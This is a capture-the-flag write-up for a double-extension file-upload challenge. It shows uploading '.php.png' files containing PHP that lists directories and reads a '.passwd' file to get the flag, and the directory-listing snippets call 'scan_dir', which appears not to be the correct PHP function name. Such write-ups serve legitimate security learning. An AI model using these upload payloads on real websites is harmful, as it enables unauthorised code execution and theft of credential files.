# Challenge19: File upload - Double extensions

## Solution:

    1. Based on challenge title, we can execute our code stored in image extension file.
    
    2. How about uploading a file ".php.png" with:
```php
<?php
echo "Hello World";
?>
```
    3. You can check and it will display "Hello World" after clicking the uploaded link.

    4. So now, how can we read ".passwd" file ?

        + First, find where ".passwd" file is
        + Second, read it

    5. So now you can create multiple file for "listdir" cmd :))
```php
<?php
print_r(scan_dir("./"));
?>

```
```php
<?php
print_r(scan_dir("../"));
?>

```
```php
<?php
print_r(scan_dir("../../"));
?>

```
```php
<?php
print_r(scan_dir("../../../"));
?>

# .passwd in this folder ;)
```
    6. After find out where is it, read it;
```php
<?php
echo file_get_contents("../../../.passwd")
?>
```
    7. Get and submit the flag :)
